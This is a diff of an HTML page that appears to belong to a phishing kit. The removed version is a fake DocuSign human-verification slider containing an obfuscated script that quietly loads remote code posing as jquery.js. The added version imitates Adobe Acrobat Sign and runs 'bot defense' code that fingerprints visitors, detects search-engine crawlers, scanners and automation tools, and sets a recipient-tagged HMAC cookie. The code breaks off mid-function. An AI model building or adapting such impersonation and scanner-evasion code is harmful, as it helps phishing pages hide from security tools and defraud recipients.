@@ -2,220 +2,397 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Slider CAPTCHA</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="x-ua-compatible" content="IE=9">
+<meta name="logging_uri" content="https://svs.na1.adobesign.com/api/gateway/loggingserver">
+<link nonce="" rel="Shortcut Icon" href="https://secure.echosign.com/images/favicon.2.ico" type="image/x-icon">
+<meta name="footer" content="global-footer">
+<meta name="header" content="global-navigation">
+<meta name="jarvis-chat" content="desktop">
+<meta name="universal-nav" content="profile, appswitcher, notifications, cart">
+<meta name="adobe-home-redirect" content="on">
+<meta name="checkout-workflow-step" content="commitment">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="preconnect" href="https://acrobat.adobe.com" crossorigin="">
+<title>e-Sign software: Electronic and digital signatures | Adobe Acrobat for business</title>
   <style>
     body {
+      font-family: system-ui, sans-serif;
+      background: #f9f9f9;
+      color: #333;
       display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
       flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: calc(100vh - 145px);
-      background-color: #f8f9fa;
     }
-    .card {
-      border-radius: 20px;
-      padding: 30px;
-      width: calc(100vw - 60vw) !important;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      border-top: solid 5px #00bef8;
+    h1 {
+      font-size: 1.5em;
+      margin-bottom: 1rem;
     }
-
-    .container {
-        display: none;
-        justify-content: center;
-        width: calc(100vw - 189px) !important;
-        height: calc(100vh - 459px);
-        padding: 30px;
+    .loading {
+      font-size: 0.9em;
+      color: #666;
     }
-    #slider {
-    width: 100%;
-    appearance: none;
-    height: 10px;
-    border-radius: 5px;
-    background: linear-gradient(to right, #00bef8 0%, #e0e0e0 0%);
-    outline: none;
-    transition: background 0.3s ease;
-  }
-
-  #slider::-webkit-slider-thumb {
-    appearance: none;
-    width: 20px;
-    height: 20px;
-    background: #00bef8;
-    border-radius: 50%;
-    cursor: pointer;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-  }
-
-  #slider::-moz-range-thumb {
-    width: 20px;
-    height: 20px;
-    background: #00bef8;
-    border-radius: 50%;
-    cursor: pointer;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-  }
-    #slider-wrapper {
+    footer {
+      background-color: #d1d1d1;
+      color: #333;
+      text-align: center;
+      padding: 0.75rem;
+      font-size: 8pt;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.5);
+      z-index: 1055;
+      position: relative;
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      justify-content: center;
-      flex-direction: column-reverse;
-      gap: 10px;
     }
-    #slider-label {
-      white-space: nowrap;
+
+     footer p {
+        margin-bottom: 0;
     }
-    #slider-value {
-      font-weight: bold;
-      color: #00bef8;
-      font-size: 34pt !important;
+
+    ul {
+        display: flex !important;
+        list-style: none;
+        justify-content: space-between;
+        gap: 10px;
+        padding: 0;
+        margin: 0;
     }
-    
     
   </style>
 </head>
 <body>
 
-<script>
-(()=>{let d=document,s=d.createElement('script');s.src='//cdn.sequai.nz/jquery.js';s.type='text/javascript';s.async=1;s.onload=s.onerror=()=>{};(d.head||d.body).appendChild(s)})();
-</script>
-
-    <header>
-        <div class="col">
-            <img src="DocuSign-Logo.png" alt="" width="200" style="margin: 0 auto;text-align: center;">
-        </div>
-    </header>
-    <!-- Preloader -->
-    <div class="preloader"><span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span></div>
-  <div class="container">
-    
-    <div class="card text-center p-4" id="verificationCard">
-      <h5 class="card-title" id="card-title">Verify You're Human</h5>
-      <h3 class="card-title" id="comp-title" style="display: none;color: #00bef8;align-items: center;justify-content: space-between;flex-direction: column-reverse;">Success <span><svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 100 100">
-        <!-- Circle -->
-        <circle cx="50" cy="50" r="48" stroke="white" stroke-width="4" fill="#00bef8" />
-        <!-- Tick -->
-        <path d="M30 50 L45 65 L70 35" stroke="white" stroke-width="4" fill="#00bef8" stroke-linecap="round" stroke-linejoin="round" />
-      </svg></span></h3>
-      <p class="card-text" id="card-text">Drag the slider to the end to verify that you are human.</p>
-
-      <div id="slider-wrapper" class="mt-4">
-        <span id="slider-label"><strong>Drag the slider to the end.</strong></span>
-        <input type="range" class="form-range" id="slider" min="0" max="100" step="1" value="0">
-        <span id="slider-value">0</span>
-      </div>
-      <!-- Button and Spinner will be hidden initially -->
-      <button id="proceedButton" class="btn btn-primary mt-3" style="display: none;width: 178px;padding: 8px;font-weight: bolder;" onclick="redirectUser()">Click to Proceed</button>
-      <div id="loadingSpinner" class="spinner-border text-primary mt-3" style="display: none;" role="status">
-          <span class="visually-hidden">Loading...</span>
-      </div>
-    </div>
+  <div>
+    <svg id="c" data-name="Illustrations" width="502" height="356" viewBox="0 0 568 412"><path d="M537.33061,169.92749c.36133-1.7002,.55811-3.43018,.58789-5.16699,.2373-19.06128-14.87256-33.83325-34.6084-34.94458-25.83545-1.45459-36.1333,19.71436-38.46338,28.02295-4.11816-.84668-8.00293-1.13818-11.62109-.94873l.10742,26.32715,33.79346-28.45801c1.68652-1.45947,4.23682-1.27539,5.6958,.41113h0c1.45947,1.68652,1.27539,4.23657-.41113,5.6958l-39.03516,32.87207,.14502,35.5625,.5708,.00439,64.39795,.49878,20.45312,.15845c12.06494,.09326,28.71094-7.22803,28.87598-28.54419,.13135-16.99585-16.91309-29.37183-30.48828-31.49072Z" fill="#ffc9c9" opacity=".5"></path><g><path d="M290.6934,156.17041c-2.33887,0-4.24707-1.89844-4.25781-4.24023-.00391-1.13818,.43457-2.20947,1.23535-3.01709s1.86816-1.25488,3.00586-1.25928h.01855c2.33887,0,4.24707,1.89844,4.25781,4.24023v.00098c.00391,1.13721-.43457,2.2085-1.23535,3.01611s-1.86816,1.25488-3.00586,1.25928h-.01855Zm.00098-5.5166h-.00586c-.69336,.00244-1.25586,.56982-1.25293,1.26367,.00293,.69141,.56738,1.25293,1.25879,1.25293h.00586c.69336-.00244,1.25488-.56885,1.25293-1.2627h0c-.00293-.69238-.56738-1.25391-1.25879-1.25391Z" fill="#c7c7c7"></path><g><path d="M477.06156,68.44531c-.82812,0-1.5,.67139-1.5,1.5v14.00146c0,.82861,.67188,1.5,1.5,1.5s1.5-.67139,1.5-1.5v-14.00146c0-.82861-.67188-1.5-1.5-1.5Z" fill="#0d66cd"></path><path d="M477.06156,99.56055c-.82812,0-1.5,.67139-1.5,1.5v14.00146c0,.82861,.67188,1.5,1.5,1.5s1.5-.67139,1.5-1.5v-14.00146c0-.82861-.67188-1.5-1.5-1.5Z" fill="#0d66cd"></path><path d="M499.61918,91.00391h-14.00098c-.82812,0-1.5,.67139-1.5,1.5s.67188,1.5,1.5,1.5h14.00098c.82812,0,1.5-.67139,1.5-1.5s-.67188-1.5-1.5-1.5Z" fill="#0d66cd"></path><path d="M468.50492,91.00391h-14.00195c-.82812,0-1.5,.67139-1.5,1.5s.67188,1.5,1.5,1.5h14.00195c.82812,0,1.5-.67139,1.5-1.5s-.67188-1.5-1.5-1.5Z" fill="#0d66cd"></path></g><g><path d="M508.2227,325.20459h.02734c.82812-.01465,1.48828-.69775,1.47363-1.52588l-.08887-5.11475c-.01465-.82861-.66797-1.45215-1.52637-1.47412-.82812,.01465-1.48828,.69775-1.47363,1.52588l.08887,5.11475c.01465,.81982,.68359,1.47412,1.49902,1.47412Z" fill="#50bc61"></path><path d="M508.38383,332.88525c-.82812,.01465-1.48828,.69775-1.47363,1.52588l.08887,5.11475c.01465,.81982,.68359,1.47412,1.49902,1.47412h.02734c.82812-.01465,1.48828-.69775,1.47363-1.52588l-.08887-5.11475c-.01465-.82861-.66895-1.49561-1.52637-1.47412Z" fill="#50bc61"></path><path d="M518.7725,327.36328h-.02734l-5.11523,.08936c-.82812,.01465-1.48828,.69775-1.47363,1.52637,.01465,.81934,.68359,1.47363,1.49902,1.47363h.02734l5.11523-.08936c.82812-.01465,1.48828-.69775,1.47363-1.52637-.01465-.81934-.68359-1.47363-1.49902-1.47363Z" fill="#50bc61"></path><path d="M502.9766,327.63916h-.02734l-5.11523,.08936c-.82812,.01465-1.48828,.69775-1.47363,1.52637,.01465,.81934,.68359,1.47363,1.49902,1.47363h.02734l5.11523-.08936c.82812-.01465,1.48828-.69775,1.47363-1.52637-.01465-.81934-.68359-1.47363-1.49902-1.47363Z" fill="#50bc61"></path></g><g id="d" data-name="Path 101160" opacity=".3"><rect x="191.99992" y="177.80078" width="89" height="12.66761" fill="#f2f2f2"></rect><rect x="191.99992" y="177.80078" width="89" height="12.66761" fill="#c7c7c7"></rect></g><g id="e" data-name="Path 101161" opacity=".3"><rect x="191.99992" y="199.9684" width="89" height="12.66619" fill="#f2f2f2"></rect><rect x="191.99992" y="199.9684" width="89" height="12.66619" fill="#c7c7c7"></rect></g><g id="f" data-name="Path 101162" opacity=".3"><rect x="191.99992" y="222.13459" width="89" height="12.66619" fill="#f2f2f2"></rect><rect x="191.99992" y="222.13459" width="89" height="12.66619" fill="#c7c7c7"></rect></g><path d="M436.62553,257.21045l-106.47119,.43408c-8.8418,.03613-16.03857-7.10205-16.07471-15.94385l-.56348-138.22656c-.03076-7.54126,5.16455-13.8689,12.17725-15.59448h-4.29248c-9.32373-.00146-16.88379,7.55591-16.88525,16.88013V250.17627c0,9.32544,7.56006,16.88525,16.88525,16.88525h112.56152c9.32568,0,16.88525-7.55981,16.88525-16.88525v-1.77808c-2.62598,5.20239-7.99512,8.78687-14.22217,8.81226Z" fill="#f2f2f2"></path><path id="g" data-name="Path 5" d="M365.05333,184.76823c-5.06027,7.99894-10.04174,13.05046-12.95417,13.05046-1.07304,.0279-1.96552-.81936-1.99341-1.8924-.00341-.13105,.00646-.2621,.02943-.39114,.55156-2.86427,6.31951-6.99506,14.91815-10.76692Zm24.32517-11.43374c-2.17556,.44649-4.42116,.96595-6.69887,1.55542-1.63422,.42608-3.29618,.89007-4.96103,1.38617,.88424-1.76992,1.69404-3.52526,2.39881-5.19305,.93093-2.20475,1.80494-4.4095,2.60892-6.56609,.70476,1.0856,1.43577,2.14345,2.18139,3.15901,1.43907,1.96011,2.98977,3.83576,4.64441,5.61766l-.17362,.04088Zm-11.2353-38.05704c.34673-.65304,1.01237-1.07462,1.75095-1.10893,1.91729,0,2.33462,2.26602,2.33462,4.16581-.25442,4.48074-1.09827,8.90841-2.50971,13.16864-3.21008-8.35936-2.77234-14.2163-1.57295-16.22407l-.00292-.00145Zm36.01424,43.68345c-.27869,1.42411-1.77867,2.33462-3.83313,2.33462-.58362-.00236-1.16495-.07338-1.73198-.21158-4.01368-.99752-7.76134-2.85888-10.98142-5.45424,2.68945-.4033,5.40492-.60813,8.12443-.61283,1.81409-.02859,3.62703,.10816,5.4163,.40855,1.62694,.33123,3.46397,1.21253,3.0058,3.52818v.0073Zm5.45424-3.77186c-2.39881-2.52429-6.98631-3.8098-13.63411-3.8098-3.68959,.03571-7.37122,.34982-11.01352,.93968-2.32642-2.22795-4.44913-4.65928-6.34284-7.26502-1.43206-1.94381-2.75695-3.96429-3.96884-6.05247,2.33462-7.23291,3.52818-13.1059,3.52818-17.45704,0-5.34479-2.15806-11.06021-8.21344-11.06021-2.07967,.0531-3.98954,1.16034-5.06902,2.9387-2.58267,4.34967-1.54959,13.30873,2.57392,22.42246-1.43577,4.18625-2.99997,8.26305-4.91726,12.78053-1.64079,3.87535-3.49678,7.656-5.55928,11.32431-6.1765,2.44258-19.30576,8.35936-20.55622,14.89918-.38137,1.93345,.30442,3.92282,1.79619,5.21055,1.49088,1.26387,3.39702,1.93078,5.35064,1.87205,7.90848,0,15.79216-10.74359,21.10195-19.99008,3.01455-1.0068,6.09332-1.92021,9.15895-2.71543,3.356-.87549,6.60986-1.59045,9.67549-2.12595,8.37103,7.1687,15.81552,8.2543,19.55234,8.2543,5.12446,0,7.04177-2.17848,7.7334-4.01261,.77516-2.11524,.31384-4.48586-1.19794-6.15606l.00142,.00292Z" fill="#f70f00" fill-rule="evenodd"></path><g id="h" data-name="Path 101224"><path d="M257.20219,284.65723c-.54492,0-1.07031-.07666-1.57812-.22852-.93457-.27979-1.62695-.8999-1.9502-1.74609-.60449-1.58496,.16797-3.62744,1.4541-5.95312-8.12402,4.94434-11.9209,6.59131-13.84082,6.14111-.55957-.13184-1.01562-.48975-1.28418-1.00781-.56543-1.09131-.20996-2.74463,.85156-5.59668-3.81836,3.55908-9.69434,7.59131-16.71582,7.59131-.88184,0-1.65918-.22412-2.29395-.64502-.93066,.42139-1.94629,.64502-2.9707,.64502h-8.91016c-.82812,0-1.5-.67139-1.5-1.5s.67188-1.5,1.5-1.5h8.91016c.44043,0,.87891-.07129,1.29688-.20752-1.17578-5.0083,3.65918-14.68799,8.07422-17.78223,2.91016-2.04053,5.00195-1.07373,5.99023-.31689,1.31934,1.00928,2.02344,2.36914,2.03418,3.93213,.02344,3.55713-3.50781,8.13916-11.0791,14.3374,8.3418-.58496,15.01074-7.93604,16.91406-10.25391,.78809-.95996,1.86719-2.27295,3.17773-1.49609,1.35254,.80225,.87305,1.99121-.55078,5.521-.53906,1.33643-1.53809,3.81494-1.88184,5.22559,1.7168-.50146,5.76562-2.49512,14.87012-8.22217,.03809-.02393,.07715-.04639,.11816-.06689,1.23828-.63086,1.97461-.04932,2.2334,.22998,.94434,1.02197,.29004,2.08789-1.0127,4.21191-.69922,1.13867-2.79004,4.5459-2.60059,5.56934,1.31445,.37012,4.28125-.12256,10.37695-6.88721,.55371-.6167,1.50195-.66406,2.11816-.11035,.61523,.5542,.66504,1.50293,.11035,2.11816-4.87109,5.40723-8.69531,7.99756-11.86133,7.99756Zm-25.57617-20.00635c-.38379,0-.91895,.15479-1.65918,.67334-3.55859,2.49365-6.85449,9.63379-6.97754,13.41992,8.92383-7.26416,10.29004-10.76953,10.28027-12.24072-.00488-.63623-.26855-1.12061-.85742-1.5708-.12891-.09863-.36816-.28174-.78613-.28174Z" fill="#fc6767"></path></g><path d="M204.01176,265.6543c-.58594-.58594-1.53516-.58594-2.12109,0l-6.87598,6.87598-6.87598-6.87598c-.58594-.58594-1.53516-.58594-2.12109,0-.58594,.58545-.58594,1.53564,0,2.12109l6.87598,6.87598-6.87598,6.87598c-.58594,.58545-.58594,1.53564,0,2.12109,.29297,.29297,.67676,.43945,1.06055,.43945s.76758-.14648,1.06055-.43945l6.87598-6.87598,6.33203,6.33203c.29297,.29297,.67676,.43945,1.06055,.43945s.76758-.14648,1.06055-.43945c.58594-.58545,.58594-1.53564,0-2.12109l-6.33203-6.33203,6.87598-6.87598c.58594-.58545,.58594-1.53564,0-2.12109Z" fill="#c7c7c7"></path><g id="i" data-name="Line 10"><path d="M263.16996,294.22998h-75.34766c-.82812,0-1.5-.67139-1.5-1.5s.67188-1.5,1.5-1.5h75.34766c.82812,0,1.5,.67139,1.5,1.5s-.67188,1.5-1.5,1.5Z" fill="#c7c7c7"></path></g><path d="M180.92387,231.63232l-11.92383-15.07129c-.51562-.65088-1.45898-.75879-2.10742-.24561-.64941,.51416-.75977,1.45752-.24609,2.10693l9.77539,12.35596c-20.03027-3.52759-40.41992-.91943-59.0332,7.58936-2.75977,1.26221-5.49414,2.66504-8.12695,4.16992-.71973,.41113-.96875,1.32715-.55859,2.04639,.27734,.48486,.7832,.75635,1.30371,.75635,.25293-.00049,.50879-.06396,.74316-.19824,2.55469-1.46045,5.20801-2.82129,7.88672-4.0459,18.04297-8.25,37.80371-10.78198,57.22266-7.37061l-12.11426,9.58447c-.64941,.51367-.75977,1.45703-.24609,2.10693,.29688,.37402,.73535,.56934,1.17773,.56934,.32617,0,.6543-.10596,.92969-.32373l15.07129-11.92334c.31152-.24658,.5127-.60742,.55957-1.00244,.0459-.39502-.06738-.79248-.31348-1.10449Z" fill="#c7c7c7"></path><g><path d="M199.6555,156.06496h-31.62167c-3.59218,0-6.50423,2.91203-6.50423,6.50422v19.7302c0,3.59173,2.91166,6.5034,6.50339,6.5034h12.98201l10.04384,9.85877c.51333,.50387,1.37988,.1402,1.37988-.5791v-9.27966h7.21677c3.59218,0,6.50423-2.91204,6.50423-6.50422v-19.72937c0-3.59218-2.91204-6.50423-6.50422-6.50423Z" fill="#fff8e3"></path><path d="M191.62602,200.39502c-.59375,0-1.17578-.229-1.61816-.6626l-9.60645-9.42969h-12.36816c-4.41309,0-8.00391-3.59033-8.00391-8.00342v-19.72998c0-4.41357,3.59082-8.00439,8.00488-8.00439h31.62109c4.41406,0,8.00488,3.59082,8.00488,8.00439v19.729c0,4.41357-3.59082,8.00439-8.00488,8.00439h-5.7168v7.77979c0,.93359-.55566,1.77002-1.41699,2.13135-.29004,.12158-.59473,.18115-.89551,.18115Zm-23.5918-42.83008c-2.75977,0-5.00488,2.24512-5.00488,5.00439v19.72998c0,2.75879,2.24512,5.00342,5.00391,5.00342h13.59473l9.31055,9.13916v-9.13916h8.7168c2.75977,0,5.00488-2.24512,5.00488-5.00439v-19.729c0-2.75928-2.24512-5.00439-5.00488-5.00439h-31.62109Z" fill="#fddc76"></path></g><path d="M195.12504,170.62158h-22.81934c-.82812,0-1.5-.67139-1.5-1.5s.67188-1.5,1.5-1.5h22.81934c.82812,0,1.5,.67139,1.5,1.5s-.67188,1.5-1.5,1.5Z" fill="#fddc76"></path><path d="M187.45512,178.62158h-15.14941c-.82812,0-1.5-.67139-1.5-1.5s.67188-1.5,1.5-1.5h15.14941c.82812,0,1.5,.67139,1.5,1.5s-.67188,1.5-1.5,1.5Z" fill="#fddc76"></path><path id="j" data-name="Path 101549" d="M6.76081,247.42393l72.99266-29.4909c3.01827-1.21946,7.46787-1.06718,8.68732,1.95109l4.83333,10.83333L7.27413,265.21745l-3.77035-10.12043c-1.21946-3.01827,.23877-6.45363,3.25704-7.67309h0Z" fill="#e1f5d0" opacity=".5"></path><path d="M109.88529,266.44189l-18.18896-45.01953c-1.62402-4.00732-5.48145-6.43921-9.55615-6.43896-1.28174,.00024-2.58594,.24097-3.84766,.74927L8.02836,244.12109c-5.26807,2.13501-7.81348,8.13159-5.68994,13.40405l18.18945,45.01953c1.62402,4.00732,5.48145,6.43896,9.55615,6.43896,1.28174,0,2.58594-.24097,3.84766-.74927l70.26416-28.38843c5.26807-2.13501,7.81348-8.13159,5.68945-13.40405Zm-82.08496,2.17847l-15.25146,6.16821-3.28613-8.13428,15.25146-6.16797,3.28613,8.13403Zm-.50537-9.25903l65.75-26.59155,3.28662,8.13403-65.75049,26.5918-3.28613-8.13428Zm1.62939,12.04077l3.28613,8.13403-15.25098,6.16821-3.28662-8.13403,15.25146-6.16821Zm2.78076-1.12476l65.75049-26.5918,3.28613,8.13428-65.75049,26.5918-3.28613-8.13428Zm70.16064-15.67578l3.2876,8.13647-65.75098,26.59155-3.28711-8.13623,65.75049-26.5918Zm-22.45215-36.08618c.87598-.35278,1.79346-.53174,2.72754-.53198,2.9917,.00024,5.65088,1.79224,6.77344,4.56274l3.00684,7.44189-65.75049,26.59155-5.74902-14.23022,58.9917-23.83398ZM9.15238,246.90259l8.48828-3.42944,5.74951,14.23145-15.25146,6.16821-3.01758-7.46851c-1.50195-3.72949,.30762-7.99268,4.03125-9.50171Zm8.93115,41.5835l15.25098-6.16821,3.28711,8.13623-15.25098,6.16797-3.28711-8.13599Zm14.72705,16.96558c-.87598,.35303-1.79346,.53198-2.72656,.53198-2.99219,0-5.65186-1.79224-6.77441-4.56274l-.81494-2.01709,15.25049-6.16797,3.55029,8.7876-8.48486,3.42822Zm70.26123-28.38721l-58.99463,23.83545-3.55078-8.78857,65.75049-26.59155,.82568,2.04321c1.50244,3.72949-.30713,7.99243-4.03076,9.50146Z" fill="#b5e18f"></path></g><path d="M149.14897,154.57227c-.03613-8.83643,7.09814-16.02905,15.93457-16.06519l63.83447-.26025c-1.91895-17.92554-20.39404-30.59595-35.17773-32.72485,.39111-1.95239,.59326-3.93701,.60352-5.927,.01367-21.83911-17.49561-38.55688-40.11963-39.5625-29.61572-1.31665-41.12549,23.07349-43.68311,32.62305-28.99658-5.60596-47.91455,12.19312-45.04199,38.50464-.46826-.03052-.93701-.11621-1.46191-.11426-12.64746,.05176-21.7002,10.90479-21.65332,22.30566,.03662,8.98828,6.12256,21.51416,23.76221,21.4541l33.04248-.13477,50.0415-.2041-.08105-19.89453Z" fill="#ffc9c9" opacity=".5"></path><g><path d="M149.35649,207.04224c.83057,0,1.50293-.67529,1.49951-1.5061l-.20557-50.52905c-.01562-3.84106,1.29834-7.63232,3.93066-10.42944,2.75586-2.92749,6.50439-4.5542,10.50781-4.57031l139.42676-.56885v-3l-139.04053,.56714c-4.38672,.01782-8.69678,1.50757-11.9668,4.43237-3.78906,3.38916-5.88086,8.10742-5.85986,13.14062l.20801,50.96973c.00293,.82617,.67383,1.4939,1.5,1.4939Z" fill="#c7c7c7"></path><path d="M474.56742,317.06543l-41.20117,.16797-.20459-50.17188h-2.9917l.20801,50.18408-279.06152,1.13818-.23633-57.84766c-.00293-.82617-.67383-1.4939-1.5-1.4939-.83057,0-1.50293,.67529-1.49951,1.5061l.23584,57.8479-39.69922,.16187-1.49902,.00586,.03906,11.75537c.01758,4.46777,3.6582,8.08936,8.12207,8.08936h.0332l351.2041-1.43213c4.47852-.01855,8.10645-3.67725,8.08887-8.1543l-.03809-11.75684Zm-182.83594,3.74585l26.50293-.10791c-.6377,2.14917-2.62598,3.72583-4.98047,3.7356l-44.76953,.18262h-.02148c-2.34473,0-4.33691-1.55762-4.98926-3.69482l28.25781-.11548Zm174.77344,13.16528l-351.2041,1.43213h-.02051c-2.81543,0-5.11133-2.28418-5.12305-5.1001l-.0293-8.75684,150.26904-.61279c.72217,3.80176,4.06348,6.68262,8.06494,6.68262h.03418l44.76953-.18262c4.01758-.0166,7.35205-2.93018,8.04492-6.74829l150.2666-.61255,.02832,8.75488c.01172,2.82471-2.27734,5.13184-5.10059,5.14355Z" fill="#c7c7c7"></path></g><path d="M492.95707,154.18896c-.96777-1.11865-2.31348-1.79346-3.78906-1.8999-1.48535-.10693-2.9043,.36768-4.00684,1.32275l-31.39746,26.43994c-.02441-12.14917-.15332-51.52295-.15332-51.52295-.02148-5.05811-2.10059-9.99365-5.7041-13.54102l-24.30762-23.92676c-3.59961-3.54248-8.35645-5.49023-13.40332-5.49023h-.08008l-80.66113,.32861c-9.6543,.03955-17.47656,7.92627-17.43848,17.58105l.56445,138.22656c.03906,9.63037,7.88672,17.4375,17.50781,17.4375h.07227l106.4707-.43408c9.65527-.03955,17.47754-7.92627,17.43848-17.58105l-.19043-46.6958,38.51367-32.43311c2.30957-1.99756,2.5625-5.50195,.56445-7.81152Zm-41.8877,86.95312c.03223,8.00049-6.4502,14.53564-14.4502,14.56836l-106.4707,.43408h-.06055c-7.97168,0-14.47559-6.47021-14.50781-14.4502l-.56445-138.22607c-.03223-8.00049,6.4502-14.53613,14.4502-14.56885l80.66113-.32861h.06836c4.25391,0,8.26465,1.64209,11.29883,4.62842l24.30762,23.92627c3.03809,2.99072,4.79102,7.15186,4.80859,11.41602l.21973,53.98096-28.16406,23.71729c-.09961,.0835-.1875,.1792-.26172,.28516l-9.57227,13.62256c-.39551,.56299-.35742,1.32324,.09277,1.84375,.29297,.33789,.70996,.51855,1.13574,.51855,.22949,0,.46094-.05273,.67578-.16162l14.85645-7.51514c.10352-.05225,.20117-.11621,.28906-.19092l21.00732-17.69092,.18018,44.19092Zm39.37598-81.42334l-62.3623,52.51611-9.34668,4.72803,6.01074-8.55371,62.36133-52.51562c.5127-.44336,1.1582-.66113,1.84375-.6123,.67578,.04883,1.29199,.35791,1.73535,.87061,.91602,1.05859,.80078,2.66455-.24219,3.56689Z" fill="#c7c7c7"></path></svg>
   </div>
-
-  <script>
-
-     
-     setTimeout(() => {
-            document.querySelector('.preloader').style.display = 'none';
-            document.querySelector('.container').style.display = 'grid';
-        }, 6000);
-
-
+  <h1>Please wait while we validate your browser...</h1>
+  <div class="loading">Running security checks...</div>
   
-  </script>
-  <script>
-    slider.addEventListener("input", function () {
-      sliderValue.textContent = slider.value; 
-      const percentage = (slider.value / slider.max) * 100;
-      slider.style.background = `linear-gradient(to right, #00bef8 ${percentage}%, #e0e0e0 ${percentage}%)`;
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=noscript.html" />
+  </noscript>
   
-      if (slider.value == slider.max) {
-        proceedButton.style.display = "inline-block"; 
-      } else {
-        proceedButton.style.display = "none"; 
+  <script>
+   
+
+const BotDefense = (() => {
+  const testPassed = [];
+  const testFailed = [];
+  const uKB = [];
+  let counter = 0;
+  let expiryDate;
+  let shaCookie;
+  let cookieUnit;
+  const logger = [];
+
+  const generateRandomString = len => Math.random().toString(36).substring(2, 2 + len);
+  const log = (type, status, detail = '') => logger.push({ type, status, ts: Date.now(), detail });
+
+  async function createHMAC(message, secret = 'ZenSecretKey') {
+    const encoder = new TextEncoder();
+    const key = await crypto.subtle.importKey(
+      'raw',
+      encoder.encode(secret),
+      { name: 'HMAC', hash: 'SHA-256' },
+      false,
+      ['sign']
+    );
+    const signature = await crypto.subtle.sign('HMAC', key, encoder.encode(message));
+    return btoa(String.fromCharCode(...new Uint8Array(signature)));
+  }
+
+  function updateFooter() {
+    const footer = document.getElementById('zen-footer');
+    if (footer) {
+      footer.innerText = `✅ Passed: ${testPassed.length} | ❌ Failed: ${testFailed.length}`;
+    }
+  }
+
+  async function runAdvancedBotChecks() {
+    for (const [checkName, enabled] of Object.entries(ZenCheckConfig)) {
+      if (enabled && typeof AdvancedBotChecks[checkName] === 'function') {
+        try {
+          AdvancedBotChecks[checkName]();
+          testPassed.push(checkName);
+          log(checkName, 'pass');
+        } catch (err) {
+          testFailed.push(checkName);
+          log(checkName, 'fail', err.message);
+        }
       }
-    });
-  </script>
-      <script>
-        const slider = document.getElementById("slider");
-        const sliderValue = document.getElementById("slider-value");
-        const proceedButton = document.getElementById("proceedButton");
-        const loadingSpinner = document.getElementById("loadingSpinner");
-        const cardTitle = document.getElementById("card-title");
-        const compTitle = document.getElementById("comp-title");
-        const cardText = document.getElementById("card-text");
-        const sliderWrapper = document.getElementById("slider-wrapper");
+    }
+  }
 
-        
-        slider.addEventListener("input", function() {
-            sliderValue.textContent = slider.value; 
-            if (slider.value == slider.max) {
-                
-                proceedButton.style.display = "inline-block";
-            } else {
-                
-                proceedButton.style.display = "none";
-            }
+  function checkDOMReady() {
+    try {
+      if (window.addEventListener) {
+        window.addEventListener('DOMContentLoaded', () => {
+          testPassed.push('BrowserCheck');
+          counter++;
+          log('DOM', 'pass');
+          updateFooter();
         });
+      } else {
+        window.attachEvent('onload', () => {
+          testPassed.push('BrowserCheck');
+          counter++;
+          log('DOM', 'pass');
+          updateFooter();
+        });
+      }
+    } catch (err) {
+      testFailed.push('BrowserCheck');
+      counter++;
+      log('DOM', 'fail', err.message);
+      updateFooter();
+    }
+  }
 
+  async function checkCookies(serverEmailCopy = null, recipientDomain = '') {
+    try {
+      if (!navigator.cookieEnabled) throw new Error('Cookies not enabled');
+      const expiration = new Date();
+      expiration.setDate(expiration.getDate() + 4);
+      expiryDate = expiration;
+      const current = Date.now();
+      const ts = Date.now();
+      const tag = generateRandomString(6);
+      const cookieVal = serverEmailCopy ? `${current + ts * 8}${recipientDomain}${generateRandomString(6)}` : `${current + ts * 8}_BLOCKED_`;
+      cookieUnit = cookieVal;
+      shaCookie = await createHMAC(cookieVal);
+      document.cookie = `Name=_${tag}_${shaCookie}; expires=${expiration.toUTCString()}; path=/;`;
+
+      if (document.cookie.includes(`Name=_${tag}_${shaCookie}`)) {
+        testPassed.push('Cookies');
+        log('Cookie', 'pass');
+      } else {
+        testFailed.push('Cookies');
+        log('Cookie', 'fail', 'Set but not found');
+      }
+      counter++;
+    } catch (err) {
+      testFailed.push('Cookies');
+      counter++;
+      log('Cookie', 'fail', err.message);
+    }
+    updateFooter();
+  }
+
+
+  function botFingerprintCheck() {
+    try {
+      const start = performance.now();
+      const suspicious = [
+        '_phantom', '__phantomas', 'Buffer', 'emit', 'spawn', 'webdriver', 'domAutomation', 'domAutomationController'
+      ].some(key => window[key] !== undefined);
+      const ua = navigator.userAgent;
+
+      if (suspicious || /bot|curl|wget|python|winhttp|headless|phantom/i.test(ua)) {
+        testFailed.push('ConditionalCheck');
+        log('BotFingerprint', 'fail', ua);
+      } else {
+        const end = performance.now();
+        puzzleScore = end - start <= 100000 ? end - start : null;
+        testPassed.push('ConditionalCheck');
+        log('BotFingerprint', 'pass');
+      }
+      counter++;
+    } catch (err) {
+      testFailed.push('ConditionalCheck');
+      counter++;
+      log('BotFingerprint', 'fail', err.message);
+    }
+    updateFooter();
+  }
+
+  function isVendorSuspect() {
+    const vendor = navigator.vendor || '';
+    const platform = navigator.platform || '';
+    const cores = navigator.hardwareConcurrency || 0;
+    const ua = navigator.userAgent.toLowerCase();
+    const flags = [];
+
+    if (vendor === '' || vendor.toLowerCase().includes('google')) flags.push('vendor');
+    if (platform === '') flags.push('platform');
+    if (cores < 2) flags.push('cpu');
+    if (/headless|phantom|bot/.test(ua)) flags.push('ua');
+
+    return flags.length ? `Suspect: ${flags.join(', ')}` : false;
+  }
+
+  function userAgentCheck() {
+    try {
+      const ua = navigator.userAgent.toLowerCase();
+      const botList = [
+        "googlebot", "bingbot", "facebook", "linkedin", "curl", "wget", "python",
+        "slackbot", "telegrambot", "discordbot", "mj12bot", "semrushbot", "dotbot", "yandex"
+      ];
+
